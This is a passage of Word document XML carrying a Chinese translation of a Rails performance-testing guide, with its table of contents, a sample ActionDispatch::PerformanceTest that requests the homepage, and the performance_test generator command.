            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>性能测试案例</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="20F7EF0E" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="008938C9" w:rsidP="004F7237">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="103"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId804" w:anchor="1-1" w:history="1">
        <w:r w:rsidR="004F7237">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>生成一个性能测试</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="629ABA16" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="008938C9" w:rsidP="004F7237">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="103"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId805" w:anchor="1-2" w:history="1">
        <w:r w:rsidR="004F7237">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>例子</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="64E1BB33" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="008938C9" w:rsidP="004F7237">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="103"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId806" w:anchor="1-3" w:history="1">
        <w:r w:rsidR="004F7237">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>模式</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="42D7923B" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="008938C9" w:rsidP="004F7237">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="103"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId807" w:anchor="1-4" w:history="1">
        <w:r w:rsidR="004F7237">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>指标（</w:t>
        </w:r>
        <w:r w:rsidR="004F7237">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Metrics</w:t>
        </w:r>
        <w:r w:rsidR="004F7237">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>）</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="6311C131" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="008938C9" w:rsidP="004F7237">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="103"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId808" w:anchor="1-5" w:history="1">
        <w:r w:rsidR="004F7237">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>输出</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="3B2D53E3" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="008938C9" w:rsidP="004F7237">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="103"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId809" w:anchor="1-6" w:history="1">
        <w:r w:rsidR="004F7237">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>测试选项</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="54F7F232" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="008938C9" w:rsidP="004F7237">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="103"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId810" w:anchor="1-7" w:history="1">
        <w:r w:rsidR="004F7237">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>性能测试环境</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="471353FC" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="008938C9" w:rsidP="004F7237">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="103"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId811" w:anchor="1-8" w:history="1">
        <w:r w:rsidR="004F7237">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>基於</w:t>
        </w:r>
        <w:r w:rsidR="004F7237">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
        <w:r w:rsidR="004F7237">
          <w:rPr>
            <w:rStyle w:val="caps"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>MRI</w:t>
        </w:r>
        <w:r w:rsidR="004F7237">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
        <w:r w:rsidR="004F7237">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>和</w:t>
        </w:r>
        <w:r w:rsidR="004F7237">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
        <w:r w:rsidR="004F7237">
          <w:rPr>
            <w:rStyle w:val="caps"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>REE</w:t>
        </w:r>
        <w:r w:rsidR="004F7237">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
        <w:r w:rsidR="004F7237">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>的</w:t>
        </w:r>
        <w:r w:rsidR="004F7237">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t xml:space="preserve"> Ruby-Prof</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="4B89D2FF" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="008938C9" w:rsidP="004F7237">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="103"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId812" w:anchor="2" w:history="1">
        <w:r w:rsidR="004F7237">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>命令行工具</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="0170626C" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="008938C9" w:rsidP="004F7237">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="103"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId813" w:anchor="2-1" w:history="1">
        <w:r w:rsidR="004F7237">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>profiler</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="4F7C7E48" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="008938C9" w:rsidP="004F7237">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="103"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId814" w:anchor="3" w:history="1">
        <w:r w:rsidR="004F7237">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t xml:space="preserve">Helper </w:t>
        </w:r>
        <w:r w:rsidR="004F7237">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>方法</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="76058112" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="008938C9" w:rsidP="004F7237">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="103"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId815" w:anchor="3-1" w:history="1">
        <w:r w:rsidR="004F7237">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Model</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="4C3590F1" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="008938C9" w:rsidP="004F7237">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="103"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId816" w:anchor="3-2" w:history="1">
        <w:r w:rsidR="004F7237">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Controller</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="3E063BB4" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="008938C9" w:rsidP="004F7237">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="103"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId817" w:anchor="3-3" w:history="1">
        <w:r w:rsidR="004F7237">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>View</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="102D2D2E" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="008938C9" w:rsidP="004F7237">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="103"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId818" w:anchor="4" w:history="1">
        <w:r w:rsidR="004F7237">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>请求日志</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="302AE773" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="008938C9" w:rsidP="004F7237">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="103"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId819" w:anchor="5" w:history="1">
        <w:r w:rsidR="004F7237">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>相关链接</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="78FDE0EB" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="008938C9" w:rsidP="004F7237">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="103"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId820" w:anchor="5-1" w:history="1">
        <w:r w:rsidR="004F7237">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t xml:space="preserve">Rails </w:t>
        </w:r>
        <w:r w:rsidR="004F7237">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>相关插件和开源包</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="3EAA95C7" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="008938C9" w:rsidP="004F7237">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="103"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId821" w:anchor="5-2" w:history="1">
        <w:r w:rsidR="004F7237">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>常用工具</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="3140B741" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="008938C9" w:rsidP="004F7237">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="103"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId822" w:anchor="5-3" w:history="1">
        <w:r w:rsidR="004F7237">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>相关教程和文档</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="1AC308CA" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="008938C9" w:rsidP="004F7237">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="103"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId823" w:anchor="6" w:history="1">
        <w:r w:rsidR="004F7237">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>商业项目</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="4734EE7F" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>1 性能测试案例</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54AE520E" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Rails 性能测试是包括基准测试，分析测试在内的一系列集成测试。用上了性能测试，你可以发现你的应用程序中存在的内存或者速度问题，对存在的问题进行更深入的检测。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E8ECDB6" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">译者：本文中，将 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="aa"/>
        </w:rPr>
        <w:t>benchmarking</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 翻译为 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>基准</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 或者 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>基准测试</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">,将 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="aa"/>
        </w:rPr>
        <w:t>profiling test</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 翻译为 _分析测试_。*performance test* 翻译为 _性能测试_，*integration test* 将翻译成 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>集成测试</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> .</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="077684CE" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">在这里我们新建一个 Rails 应用程序， </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>test/performance/browsing_test.rb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ，在这个文件里写入一个测试的例子：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8306"/>
      </w:tblGrid>
      <w:tr w:rsidR="004F7237" w14:paraId="42FC0FBF" w14:textId="77777777" w:rsidTr="004F7237">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="68D18376" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>require 'test_helper'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="48AD41A6" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>require 'rails/performance_test_help'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="39BC59D8" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="09CF7376" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># Profiling results for each test method are written to tmp/performance.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="768D2DFC" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>BrowsingTest &lt; ActionDispatch::PerformanceTest</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="212A1EA0" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>test_homepage</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="67E5A030" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    get '/'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6F3F36E3" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6729A06B" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5AF4FB49" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">这是一个简单的性能测试用例，他会对你的应用首页( homepage )的 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>GET</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 请求进行分析测试。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="035904C0" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>1.1 生成一个性能测试</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0917FC71" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Rails 提供了一个叫作 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>performance_test</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 的生成器(generator) 来新建一个性能测试</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5040"/>
      </w:tblGrid>
      <w:tr w:rsidR="004F7237" w14:paraId="35DD9938" w14:textId="77777777" w:rsidTr="004F7237">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="783C217C" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:divId w:val="2035810672"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>$ rails generate performance_test homepage</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="114BC6E6" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">这里生成的 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>performance_test.rb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 会在 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>test/performance</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 目录中：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6168"/>
      </w:tblGrid>
      <w:tr w:rsidR="004F7237" w14:paraId="4E35811B" w14:textId="77777777" w:rsidTr="004F7237">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="231A18F5" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>require 'test_helper'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3B3C39B5" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>require 'rails/performance_test_help'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="107EB245" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6789A88D" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>HomepageTest &lt; ActionDispatch::PerformanceTest</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="27141EDD" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  # Replace this with your real tests.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="49F0BE81" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>test_homepage</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="33C939E0" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    get '/'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="49BE0624" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
